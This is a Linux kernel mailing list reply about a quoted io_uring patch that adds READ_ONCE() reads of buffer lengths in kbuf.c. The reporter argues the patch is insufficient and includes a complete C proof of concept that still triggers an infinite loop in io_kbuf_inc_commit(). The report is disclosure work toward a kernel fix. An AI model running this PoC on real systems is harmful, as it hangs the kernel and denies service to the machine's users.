Return-Path: <io-uring+bounces-9362-lists+io-uring=lfdr.de@vger.kernel.org>
X-Original-To: lists+io-uring@lfdr.de
Delivered-To: lists+io-uring@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 6123EB39127
	for <lists+io-uring@lfdr.de>; Thu, 28 Aug 2025 03:38:42 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id B976C983440
	for <lists+io-uring@lfdr.de>; Thu, 28 Aug 2025 01:38:40 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id BE3A821A434;
	Thu, 28 Aug 2025 01:37:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="t9bCdBOf"
X-Original-To: io-uring@vger.kernel.org
Received: from out203-205-221-236.mail.qq.com (out203-205-221-236.mail.qq.com [203.205.221.236])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 89C4221773D;
	Thu, 28 Aug 2025 01:37:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.236
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1756345032; cv=none; b=elb7JqUVtrIjyqN5qVRRZgtDsNYNE++6rNxRe+hLEmpVJ/lV0nmGjbFjd9vH/c6yyOc6BIDP2xY3YoS4JOho89q1tpztYfaXoxCoFXhwdhF2SdHUTGi86Vp5XDnsBheXfXGriYB8ad6Z19sxQGaJZip2eTR10/jorrqhbabg+W8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1756345032; c=relaxed/simple;
	bh=4HrtJyCgz5outgZsrWreunen6H5khAGfYNYvkKjkRV0=;
	h=Message-ID:From:To:Cc:Subject:Date:In-Reply-To:References:
	 MIME-Version; b=DbesPPmXbSuyO1OcHI5CjZEtiIw1cKzj/Kx8vtL9UUzvyS8QUF6PrXKpZIUDLhpc3rAkJ37yEKdWdP2myIisjgXscRk1jTXa0b+JaSFD3KJJ/eXyVwQ/bT6tSP/y+b1h5beB/O7dpqTW+PMb+yEb95HnqfYgTp+LflJss1eVZhs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=t9bCdBOf; arc=none smtp.client-ip=203.205.221.236
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1756345021; bh=/sr+eSuAYU3WbwRQK33VHOQJ6d8mU+6xKUUv6PfTlaM=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=t9bCdBOfS2rs68fVrFlyf3ArlBmybw2LSKarIxlurf3oAM3LFY+UqUb6sThEQXPys
	 RzEa6XTR5LQipN02rnBDj+3Yd6jz7e6pcnVr/heHvkY6wnOlIirr6Sp3VnK7ozPT8M
	 j5fUi2fHul0LsX4uxRrGKLX550LamBC95FW/V6zo=
Received: from nebula-bj.localdomain ([223.104.40.195])
	by newxmesmtplogicsvrszb42-0.qq.com (NewEsmtp) with SMTP
	id 93ABE854; Thu, 28 Aug 2025 09:36:58 +0800
X-QQ-mid: xmsmtpt1756345018t2irkinp4
Message-ID: <tencent_2DEFFED135071FB225305A65D1688B303A09@qq.com>
X-QQ-XMAILINFO: MllZffuBkEb5Szf0QZGBMmOVO0N411OCOvRYQBqGmUAd+7N/epmnsE9IC5Mbzh
	 O3WKNeUY8LoL6LNqJSSY0cVW1ubeTnRVD8WL64RayKq5PJ4fZVRW+psZYNl1EaCQsr/x9VolDjm2
	 3XhCdqsNmY28UDqNiyYYXzwf1m41A8LiMFElZV8BOxsfxpYsQ0jlVjWzkcBAcF7Y1tQ++QckvbAR
	 gIvs5qdZKwMLYYK6BKKg8twkYQR+8TmrTS3FtXD3SRVWvOXd06PIN6ZaU40ODWXpEw1JDJDRY8K8
	 6wRCkMFSJtpc1lbL+IsEAzBy/GjVeVDb3BHiGdfgzanKHbuC+eMfG8mO85jENAjWv0E+7WNnsxAn
	 xKmbmqC1mzi1naMP/dinYR19ODvnn+FUA+d96F5iBxwY0X9RaKoKumBkdoD3JDiQ+LybExbjizvu
	 WGTZibQNMnrTgxOHWyOPB1UH9dd8wx0SDr0ffWXnZYGEBPAJbn8NzFGtsXragJUGryMglRvCys76
	 3LmknweCydn+KZ5RdoYaxEg1w1zvi00mz9Ne5jO2nHhZnmNhh9LQRc1Yjjreuj2MLohLryWRJYbu
	 1GmqOasRS31Uf7BFwUFksA6q2I7cF9DthNa18CycsDTDkp6pesmj8a+kGQYoar06oscoYgR8T35V
	 9sNEbZM8xpY4o2M8G4IBNaaXoQLOe3hkxLyKULto65eZZl6h/InAeJQ8QsYYNt2l1zBAbmAP9jH3
	 JKaC4yz4/0k0bgqVZxJQpAqVro3Hxai9iIvP4xEMZzdEiPGd4eNv71VM7MObTaCFTWrWN1aQCxIp
	 j+saWvZcSdlhWiPclI0AHDQO+ag5BBurXJgKNjQMPBzDf0sqW4e+X9tWFOAXqsou7/PVy8NpUtr3
	 5gIGRDJkOA7H0X9cMQ7gzPUcAkO2pEguoU0ufu6nPbK1vs1gQB8RFNHzLUPqG5g3gyWgg3kWA/Vy
	 lPMNBryuKSYr4dgMC1GEi7k5GU0bwpBZY+AAzj3qfkQwIOi+BMAWW/v8/fOYe6O/4qZDBvSYi4UW
	 dPT8pE8T2xnekm62KIgvnLiAy3c4KMKGPqKGkcMROG1KMgJZADtjTky0V+HTG9AbmBRljWVQ==
X-QQ-XMRINFO: OD9hHCdaPRBwq3WW+NvGbIU=
From: Qingyue Zhang <chunzhennn@qq.com>
To: axboe@kernel.dk
Cc: aftern00n@qq.com,
	chunzhennn@qq.com,
	io-uring@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: Re: [PATCH 2/2] io_uring/kbuf: fix infinite loop in io_kbuf_inc_commit()
Date: Thu, 28 Aug 2025 09:36:58 +0800
X-OQ-MSGID: <20250828013658.29061-1-chunzhennn@qq.com>
X-Mailer: git-send-email 2.48.1
In-Reply-To: <4b8eb795-239f-4f46-af4f-7a05056ab516@kernel.dk>
References: <4b8eb795-239f-4f46-af4f-7a05056ab516@kernel.dk>
Precedence: bulk
X-Mailing-List: io-uring@vger.kernel.org
List-Id: <io-uring.vger.kernel.org>
List-Subscribe: <mailto:io-uring+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:io-uring+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

On 2025-08-27 21:45 UTC, Jens Axboe wrote:
> I took a closer look and there's another spot where we should be
> using READ_ONCE() to get the buffer length. How about something like
> the below rather than the loop work-around?
> 
> 
> commit 7f472373b2855087ae2df9dc6a923f3016a1ed21
> Author: Jens Axboe <axboe@kernel.dk>
> Date:   Wed Aug 27 15:27:30 2025 -0600
> 
>     io_uring/kbuf: always use READ_ONCE() to read ring provided buffer lengths
>     
>     Since the buffers are mapped from userspace, it is prudent to use
>     READ_ONCE() to read the value into a local variable, and use that for
>     any other actions taken. Having a stable read of the buffer length
>     avoids worrying about it changing after checking, or being read multiple
>     times.
>     
>     Fixes: c7fb19428d67 ("io_uring: add support for ring mapped supplied buffers")
>     Link: https://lore.kernel.org/io-uring/tencent_000C02641F6250C856D0C26228DE29A3D30A@qq.com/
>     Reported-by: Qingyue Zhang <chunzhennn@qq.com>
>     Signed-off-by: Jens Axboe <axboe@kernel.dk>
> 
> diff --git a/io_uring/kbuf.c b/io_uring/kbuf.c
> index 81a13338dfab..394037d3f2f6 100644
> --- a/io_uring/kbuf.c
> +++ b/io_uring/kbuf.c
> @@ -36,15 +36,18 @@ static bool io_kbuf_inc_commit(struct io_buffer_list *bl, int len)
>  {
>  	while (len) {
>  		struct io_uring_buf *buf;
> -		u32 this_len;
> +		u32 buf_len, this_len;
>  
>  		buf = io_ring_head_to_buf(bl->buf_ring, bl->head, bl->mask);
> -		this_len = min_t(u32, len, buf->len);
> -		buf->len -= this_len;
> -		if (buf->len) {
> +		buf_len = READ_ONCE(buf->len);
> +		this_len = min_t(u32, len, buf_len);
> +		buf_len -= this_len;
> +		if (buf_len) {
>  			buf->addr += this_len;
> +			buf->len = buf_len;
>  			return false;
>  		}
> +		buf->len = 0;
>  		bl->head++;
>  		len -= this_len;
>  	}
> @@ -159,6 +162,7 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
>  	__u16 tail, head = bl->head;
>  	struct io_uring_buf *buf;
>  	void __user *ret;
> +	u32 buf_len;
>  
>  	tail = smp_load_acquire(&br->tail);
>  	if (unlikely(tail == head))
> @@ -168,8 +172,9 @@ static void __user *io_ring_buffer_select(struct io_kiocb *req, size_t *len,
>  		req->flags |= REQ_F_BL_EMPTY;
>  
>  	buf = io_ring_head_to_buf(br, head, bl->mask);
> -	if (*len == 0 || *len > buf->len)
> -		*len = buf->len;
> +	buf_len = READ_ONCE(buf->len);
> +	if (*len == 0 || *len > buf_len)
> +		*len = buf_len;
>  	req->flags |= REQ_F_BUFFER_RING | REQ_F_BUFFERS_COMMIT;
>  	req->buf_list = bl;
>  	req->buf_index = buf->bid;
> @@ -265,7 +270,7 @@ static int io_ring_buffers_peek(struct io_kiocb *req, struct buf_sel_arg *arg,
>  
>  	req->buf_index = buf->bid;
>  	do {
> -		u32 len = buf->len;
> +		u32 len = READ_ONCE(buf->len);
>  
>  		/* truncate end piece, if needed, for non partial buffers */
>  		if (len > arg->max_len) {

I'm afraid this doesn't solve the problem. the value of buf->len
could be changed before the function is called. Maybe we shouldn't
trust it at all?

Here is a PoC that can still trigger infinite loop:

#include<liburing.h>
#include<liburing/io_uring.h>
#include<netinet/in.h>
#include<stdint.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<stdlib.h>
int main(){
    struct io_uring ring;
    struct io_uring_buf* buf_info;

    posix_memalign((void**)&buf_info, 4096, 4096);
    char* buf = malloc(0x1000);
    struct io_uring_buf_reg reg = {
        .ring_addr = (uint64_t)buf_info,
        .ring_entries = 2
    };
    buf_info[0].addr = (uint64_t)buf_info;
    buf_info[0].len = 0x1000;
    buf_info[0].bid = 0;
    buf_info[0].resv = 1; // tail
    io_uring_queue_init(0x10, &ring, IORING_SETUP_NO_SQARRAY);
    io_uring_register_buf_ring(&ring, &reg, IOU_PBUF_RING_INC);

    int fds[2];
    socketpair(AF_UNIX, SOCK_DGRAM, 0, fds);
    void* send_buf = calloc(1, 32);
    send(fds[0], send_buf, 32, MSG_DONTWAIT);

    struct io_uring_sqe* sqe = io_uring_get_sqe(&ring);
    io_uring_prep_recv(sqe, fds[1], NULL, 0, 0);
    sqe->flags |=  1<<IOSQE_BUFFER_SELECT_BIT;
    io_uring_submit(&ring);
    struct io_uring_cqe* cqe;
    io_uring_wait_cqe(&ring, &cqe);
}


